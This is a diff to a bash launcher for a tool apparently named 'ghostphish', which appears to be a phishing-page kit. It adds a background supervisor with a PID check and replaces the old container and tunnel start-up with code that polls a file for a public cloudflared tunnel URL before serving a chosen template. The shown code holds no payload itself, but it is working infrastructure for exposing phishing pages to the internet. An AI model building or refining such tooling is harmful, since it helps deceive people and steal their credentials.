@@ -481,6 +481,17 @@ main() {
     banner
     section "PREFLIGHT"
     printf "\n"
+
+    # Start unified launcher in background (if not already running)
+    if ! [[ -f "${SCRIPT_DIR}/ghostphish_maintenance.pid" ]] || \
+       ! kill -0 "$(cat "${SCRIPT_DIR}/ghostphish_maintenance.pid" 2>/dev/null)" 2>/dev/null; then
+        msg_info "starting unified supervisor in background..."
+        bash "${SCRIPT_DIR}/launch-and-maintain.sh" start >/dev/null 2>&1
+        sleep 5
+    else
+        msg_ok "supervisor already running"
+    fi
+
     check_deps
     if [ "$RUNTIME" = "docker" ]; then
         msg_ok "runtime: ${W}docker${N} + docker-compose"
@@ -494,8 +505,8 @@ main() {
     else
         msg_warn "cloudflared missing · localhost-only mode"
     fi
-    start_container
-    sleep 1
+
+    msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N}"
 
     while true; do
         pick_template
@@ -503,10 +514,21 @@ main() {
         URL_PATH=""
         pick_url_path || continue
         if [[ "$DELIVERY" == "tunnel" ]]; then
-            banner
-            section "TUNNEL DEPLOY"
-            printf "\n"
-            start_tunnel
+            # Unified launcher already handles tunnel, just read the URL
+            TUNNEL_URL=$(cat "${SCRIPT_DIR}/ghostphish_current.url" 2>/dev/null || echo "")
+            if [[ -z "$TUNNEL_URL" ]]; then
+                msg_warn "waiting for tunnel to connect..."
+                for i in {1..20}; do
+                    TUNNEL_URL=$(cat "${SCRIPT_DIR}/ghostphish_current.url" 2>/dev/null || echo "")
+                    [[ -n "$TUNNEL_URL" ]] && break
+                    sleep 1
+                done
+            fi
+            if [[ -z "$TUNNEL_URL" ]]; then
+                msg_err "tunnel unavailable"
+                sleep 2
+                continue
+            fi
         else
             TUNNEL_URL="http://localhost:${PORT}"
         fi
